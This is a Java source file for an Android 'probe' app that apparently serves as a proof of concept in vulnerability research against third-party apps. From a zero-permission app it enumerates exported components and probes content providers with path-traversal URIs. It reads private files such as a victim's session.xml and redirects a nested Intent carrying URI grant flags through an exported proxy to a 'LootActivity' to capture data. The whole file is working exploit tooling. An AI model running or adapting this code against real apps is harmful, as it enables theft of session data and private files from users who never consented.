package com.sanehunters.probe;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.ProviderInfo;
import android.content.pm.ServiceInfo;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.text.method.ScrollingMovementMethod;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.util.Arrays;
import java.util.Locale;

/**
 * probe — the zero-permission test application used to establish attacker model AM-03.
 *
 * WHY: `adb shell am start` runs as the shell UID, which holds far more privilege than any installed
 * third-party app. A result observed only through adb is discovery; the same result reproduced from this
 * app (whose manifest declares no permissions) is the AM-03 proof the report needs.
 *
 * TWO WAYS TO DRIVE IT
 *   1. Buttons (for the PoC video — the log pane is the narration; docs/04).
 *   2. Headless, from adb, so an autonomous model can run and read it:
 *        adb shell am start -n com.sanehunters.probe/.MainActivity \
 *          --es run baseline,enumerate,provider,read,redirect,deeplink \
 *          --es victim com.target.app --es authority com.target.app.fileprovider \
 *          --es uri "content://com.target.app.fileprovider/root/data/data/com.target.app/shared_prefs/session.xml" \
 *          --es deeplink "targetapp://open?url=https://example.test/" \
 *          --es proxy com.target.app.ProxyActivity --es target com.target.app.InternalActivity \
 *          --es extra intent --es mode loot --ez finish false
 *        adb logcat -s PROBE:V        # every result is one line:  PROBE|<step>|<key>=<value>
 *
 * LOG CONTRACT: print the RAW platform return value with its meaning in parentheses; never paraphrase.
 * Steps print PROBE|<step>|... to logcat AND to the on-screen pane. Candidates, never findings.
 */
public class MainActivity extends Activity {
    static final String TAG = "PROBE";

    // Defaults — overridden by intent extras in headless mode. Edit for a button-driven session.
    String victim = "com.victim.app";
    String finding = "F-001";
    String klass = "exported provider -> private file read";
    String precond = "no permissions · targetSdk 35";
    String proxy = null;        // victim's exported component that forwards an Intent it receives
    String target = null;       // victim's non-exported component (mode=internal)
    String authority = null;    // provider authority under test
    String uri = null;          // content:// URI the read step opens
    String deeplink = null;     // BROWSABLE VIEW URI the deeplink step fires
    String extraKey = "intent"; // extra name the proxy reads the nested Intent from
    String mode = "loot";       // loot: nested Intent targets our LootActivity (captures a forwarded grant)
                                // internal: nested Intent targets the victim's non-exported component

    TextView log; ScrollView scroll;

    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        setContentView(R.layout.activity_main);
        log = findViewById(R.id.log);
        scroll = findViewById(R.id.scroll);
        log.setMovementMethod(new ScrollingMovementMethod());
        readExtras(getIntent());
        ((TextView) findViewById(R.id.header)).setText(finding + " — " + klass + "\n" + precond + "\nvictim=" + victim);

        LinearLayout bar = findViewById(R.id.buttons);
        btn(bar, "0) BASELINE — what I am NOT allowed to do", v -> baseline());
        btn(bar, "1) ENUMERATE victim surface", v -> enumerate());
        btn(bar, "2) PROVIDER — query / call / open, separately", v -> providers());
        btn(bar, "3) READ the URI under test", v -> readUri(uri));
        btn(bar, "4) REDIRECT through the exported proxy", v -> redirect());
        btn(bar, "5) DEEP LINK as a web page would fire it", v -> deeplink());

        p("ready", "declared_permissions=NONE", "uid=" + android.os.Process.myUid());
        String run = getIntent().getStringExtra("run");
        if (run != null) {
            for (String step : run.split(",")) runStep(step.trim().toLowerCase(Locale.ROOT));
            if (getIntent().getBooleanExtra("finish", false)) finish();
        }
    }

    void readExtras(Intent i) {
        if (i == null) return;
        victim    = opt(i, "victim", victim);
        finding   = opt(i, "finding", finding);
        klass     = opt(i, "class", klass);
        precond   = opt(i, "precond", precond);
        proxy     = opt(i, "proxy", proxy);
        target    = opt(i, "target", target);
        authority = opt(i, "authority", authority);
        uri       = opt(i, "uri", uri);
        deeplink  = opt(i, "deeplink", deeplink);
        extraKey  = opt(i, "extra", extraKey);
        mode      = opt(i, "mode", mode);
    }
    static String opt(Intent i, String k, String d) { String v = i.getStringExtra(k); return v == null || v.isEmpty() ? d : v; }

    void runStep(String s) {
        switch (s) {
            case "baseline": baseline(); break;
            case "enumerate": enumerate(); break;
            case "provider": providers(); break;
            case "read": readUri(uri); break;
            case "redirect": redirect(); break;
            case "deeplink": deeplink(); break;
            default: p("error", "unknown_step=" + s);
        }
    }

    // ── 0 · Beat 4 of the evidence standard: the negative control, stated by the app itself ──
    void baseline() {
        p("baseline", "declared_permissions=NONE", "uid=" + android.os.Process.myUid());
        if (uri == null) { p("baseline", "uri=UNSET", "note=pass --es uri to test a direct read"); return; }
        try {
            int r = checkCallingOrSelfUriPermission(Uri.parse(uri), Intent.FLAG_GRANT_READ_URI_PERMISSION);
            p("baseline", "checkUriPermission=" + r + " (0=GRANTED, -1=DENIED)");
        } catch (Throwable t) { p("baseline", "checkUriPermission_threw=" + t); }
        p("baseline", "direct_read=attempt (expected to fail if the control works)");
        readUri(uri);
    }

    // ── 1 · the victim's surface as an unprivileged UID actually sees it ──
    void enumerate() {
        PackageManager pm = getPackageManager();
        try {
            PackageInfo pi = pm.getPackageInfo(victim, PackageManager.GET_ACTIVITIES | PackageManager.GET_PROVIDERS
                    | PackageManager.GET_RECEIVERS | PackageManager.GET_SERVICES);
            p("enumerate", "versionName=" + pi.versionName, "versionCode=" + pi.versionCode);
            if (pi.activities != null) for (ActivityInfo a : pi.activities)
                if (a.exported) p("enumerate", "activity=" + a.name, "permission=" + (a.permission == null ? "NONE" : a.permission));
            if (pi.providers != null) for (ProviderInfo x : pi.providers)
                if (x.exported) p("enumerate", "provider=" + x.authority, "read=" + x.readPermission, "write=" + x.writePermission, "grantUri=" + x.grantUriPermissions);
            if (pi.receivers != null) for (ActivityInfo a : pi.receivers)
                if (a.exported) p("enumerate", "receiver=" + a.name, "permission=" + (a.permission == null ? "NONE" : a.permission));
            if (pi.services != null) for (ServiceInfo s : pi.services)
                if (s.exported) p("enumerate", "service=" + s.name, "permission=" + (s.permission == null ? "NONE" : s.permission));
        } catch (Throwable t) {
            p("enumerate", "getPackageInfo_failed=" + t.getClass().getSimpleName(),
              "note=on API 30+ the <queries> element must name the victim; an empty result here is a package-visibility artefact, not a negative");
        }
    }

    // ── 2 · read, write and call() are three separate questions ──
    void providers() {
        if (authority == null) { p("provider", "authority=UNSET"); return; }
        for (String path : new String[]{"", "/", "/1", "/..", "/..%2f..%2fshared_prefs"}) {
            Uri u = Uri.parse("content://" + authority + path);
            try (Cursor c = getContentResolver().query(u, null, null, null, null)) {
                p("provider", "query=" + u, "result=" + (c == null ? "null_cursor" : c.getCount() + "_rows (READABLE candidate)"));
            } catch (Throwable t) { p("provider", "query=" + u, "result=" + t.getClass().getSimpleName()); }
        }
        for (String m : new String[]{"test", "getInfo", "get", "init"}) {
            try {
                Bundle r = getContentResolver().call(Uri.parse("content://" + authority), m, null, null);
                p("provider", "call=" + m, "result=" + (r == null ? "null" : "Bundle" + r.keySet() + " (RETURNED candidate)"));
            } catch (Throwable t) { p("provider", "call=" + m, "result=" + t.getClass().getSimpleName()); }
        }
    }

    // ── 3 · the read primitive, with byte count ──
    void readUri(String target) {
        if (target == null) { p("read", "uri=UNSET"); return; }
        ContentResolver cr = getContentResolver();
        try (InputStream in = cr.openInputStream(Uri.parse(target))) {
            if (in == null) { p("read", "uri=" + target, "openInputStream=null"); return; }
            ByteArrayOutputStream bo = new ByteArrayOutputStream();
            byte[] buf = new byte[4096]; int n, total = 0;
            while ((n = in.read(buf)) > 0 && total < 8192) { bo.write(buf, 0, n); total += n; }
            String s = bo.toString();
            p("read", "uri=" + target, "bytes=" + total + " (READ candidate; declared permissions NONE)");
            p("read", "head=" + (s.length() > 400 ? s.substring(0, 400) + "..." : s).replace('\n', ' '));
        } catch (Throwable t) {
            p("read", "uri=" + target, "openInputStream=" + t.getClass().getSimpleName() + ": " + t.getMessage());
        }
    }

    // ── 4 · nested Intent through the victim's exported proxy ──
    // mode=loot     the nested Intent targets OUR LootActivity carrying the victim's content URI and grant flags;
    //               if the proxy forwards it, the grant is minted by the victim (the confused deputy) and
    //               LootActivity records what it can now read. This is the shape that establishes the primitive.
    // mode=internal the nested Intent targets the victim's own non-exported component (reachability proof only).
    void redirect() {
        if (proxy == null) { p("redirect", "proxy=UNSET", "note=pass --es proxy <victim exported component>"); return; }
        Intent inner = new Intent();
        if ("internal".equals(mode)) {
            if (target == null) { p("redirect", "target=UNSET for mode=internal"); return; }
            inner.setClassName(victim, target);
        } else {
            inner.setClassName(getPackageName(), LootActivity.class.getName());
        }
        if (uri != null) inner.setData(Uri.parse(uri));
        inner.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION
                | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION | Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION
                | Intent.FLAG_ACTIVITY_NEW_TASK);
        Intent outer = new Intent();
        outer.setClassName(victim, proxy);
        outer.putExtra(extraKey, inner);
        outer.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        p("redirect", "mode=" + mode, "proxy=" + proxy, "extra=" + extraKey, "inner=" + inner.getComponent().flattenToShortString(), "data=" + uri);
        try { startActivity(outer); p("redirect", "startActivity=sent", "next=watch logcat PROBE|loot"); }
        catch (Throwable t) { p("redirect", "startActivity_failed=" + t); }
    }

    // ── 5 · fire the deep link exactly as a web page would ──
    void deeplink() {
        if (deeplink == null) { p("deeplink", "uri=UNSET"); return; }
        Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse(deeplink));
        i.addCategory(Intent.CATEGORY_BROWSABLE);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        try { startActivity(i); p("deeplink", "uri=" + deeplink, "startActivity=sent", "next=adb shell dumpsys activity activities | grep -m1 topResumedActivity"); }
        catch (Throwable t) { p("deeplink", "uri=" + deeplink, "startActivity_failed=" + t.getClass().getSimpleName()); }
    }

    // ── plumbing ──
    void btn(LinearLayout bar, String label, View.OnClickListener l) {
        Button b = new Button(this); b.setText(label); b.setAllCaps(false); b.setTextSize(11); b.setOnClickListener(l); bar.addView(b);
    }
    void p(String step, String... kv) {
        final String line = "PROBE|" + step + "|" + String.join("|", Arrays.asList(kv));
        Log.i(TAG, line);
        runOnUiThread(() -> { log.append(line + "\n"); scroll.post(() -> scroll.fullScroll(View.FOCUS_DOWN)); });
    }
}
